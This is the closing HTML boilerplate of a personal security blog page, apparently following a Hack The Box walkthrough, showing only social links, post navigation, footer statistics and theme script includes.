            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBoxÈù∂Êú∫ÁªÉ‰π†</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/02/03/fingerprint/" rel="prev" title="Hack-The-Box-walkthrough[fingerprint]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[fingerprint]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/02/16/acute/" rel="next" title="Hack-The-Box-walkthrough[acute]">
                  Hack-The-Box-walkthrough[acute] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 ‚Äì 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">618k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">37:26</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
